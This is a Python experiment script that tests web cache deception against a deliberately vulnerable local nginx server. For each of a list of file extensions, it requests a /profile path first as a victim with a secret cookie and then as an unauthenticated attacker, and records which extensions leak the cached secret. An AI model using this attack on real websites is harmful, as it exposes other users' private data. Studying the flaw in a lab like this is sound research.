"""Bonus experiment: which file extensions spring the trap?

WCD depends on the cache thinking the URL is a static file. We attack the same
vulnerable page (/profile) with many different extensions and measure whether an
unauthenticated attacker can read back the victim's cached secret. Extensions
the cache treats as static succeed; others fail.

Assumes the VULNERABLE nginx config is active. Output: results/extension.csv
Run:  .venv/bin/python experiments/run_extension.py
"""
from __future__ import annotations
import csv, sys, pathlib
sys.path.insert(0, str(pathlib.Path(__file__).resolve().parents[1]))
from detector.http import fetch, cache_status

BASE = "http://localhost:8080"
TARGET = "/profile"
ROOT = pathlib.Path(__file__).resolve().parents[1]
RESULTS = ROOT / "results"; RESULTS.mkdir(exist_ok=True)

# A mix: classic static extensions vs. non-static ones.
EXTS = ["css", "js", "png", "jpg", "gif", "svg", "woff2", "pdf", "txt",
        "php", "html", "json", "aspx", "xml"]


def attack_with_ext(ext: str) -> bool:
    import secrets
    url = f"{BASE}{TARGET}/{secrets.token_hex(6)}.{ext}"
    victim = fetch(url, cookies={"user": "VICTIM_SECRET"})
    attacker = fetch(url)
    return (attacker.status_code == 200
            and "VICTIM_SECRET" in attacker.text
            and cache_status(attacker) == "HIT")


def main() -> None:
    rows = []
    print(f"Attacking {TARGET} with different extensions ...")
    for ext in EXTS:
        ok = attack_with_ext(ext)
        rows.append({"extension": ext, "attack_success": ok})
        print(f"  .{ext:<5s} -> {'LEAK' if ok else 'safe'}")
    with (RESULTS / "extension.csv").open("w", newline="") as f:
        w = csv.DictWriter(f, fieldnames=["extension", "attack_success"])
        w.writeheader(); w.writerows(rows)
    print(f"\n{sum(r['attack_success'] for r in rows)}/{len(rows)} extensions leaked."
          "\nWrote results/extension.csv")


if __name__ == "__main__":
    main()
